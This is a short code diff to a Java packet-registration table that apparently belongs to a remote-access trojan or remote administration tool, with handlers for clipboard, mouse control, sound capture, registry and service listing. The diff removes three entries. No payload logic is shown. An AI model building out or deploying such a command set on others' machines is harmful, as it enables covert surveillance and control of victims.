@@ -33,7 +33,6 @@ public class IncomingPackets {
         PACKETS_INCOMING.put((short) 44, Packet44PlaySoundFromURL.class);
         PACKETS_INCOMING.put((short) 46, Packet46CrazyMouse.class);
         PACKETS_INCOMING.put((short) 59, Packet59Clipboard.class);
-        PACKETS_INCOMING.put((short) 61, Packet61SystemJavaProperties.class);
         PACKETS_INCOMING.put((short) 66, Packet66PianoNote.class);
         PACKETS_INCOMING.put((short) 67, Packet67LongPianoNote.class);
         PACKETS_INCOMING.put((short) 69, Packet69Print.class);
@@ -42,9 +41,7 @@ public class IncomingPackets {
         PACKETS_INCOMING.put((short) 75, Packet75AllThumbnails.class);
         PACKETS_INCOMING.put((short) 76, Packet76Speech.class);
         PACKETS_INCOMING.put((short) 77, Packet77ListServices.class);
-        PACKETS_INCOMING.put((short) 78, Packet78RegistryStartup.class);
         PACKETS_INCOMING.put((short) 80, Packet80CustomRegQuery.class);
-        PACKETS_INCOMING.put((short) 81, Packet81InstalledPrograms.class);
         PACKETS_INCOMING.put((short) 82, Packet82NetworkAdapters.class);
         PACKETS_INCOMING.put((short) 83, Packet83ClientDownloadSound.class);
         PACKETS_INCOMING.put((short) 84, Packet84ToggleSoundCapture.class);
